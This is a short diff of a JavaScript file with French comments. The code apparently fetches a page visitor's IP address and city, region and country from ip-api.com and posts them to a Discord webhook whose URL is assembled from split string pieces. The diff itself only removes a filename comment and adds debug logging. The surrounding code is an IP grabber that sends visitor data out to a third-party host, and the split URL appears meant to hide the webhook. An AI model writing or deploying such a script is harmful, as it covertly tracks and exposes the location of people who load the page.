@@ -1,5 +1,3 @@
-// script.js
-
 // Fonction pour envoyer une requête POST au webhook Discord
 function sendToDiscord(ip, location) {
     const part1 = "https://discord.com/api/webhooks/";
@@ -33,7 +31,8 @@ function getUserIPAndLocation() {
     fetch('https://ip-api.com/json')
         .then(response => response.json())
         .then(data => {
-            const ip = data.query; // Corrected to 'query' if API response has IP there
+            console.log(data); // Inspecter la structure de la réponse
+            const ip = data.query; // Cela devrait être 'data.query' si 'query' est l'attribut correct pour l'IP
             const location = `${data.city}, ${data.regionName}, ${data.country}`;
             console.log('User IP:', ip);
             console.log('Location:', location);
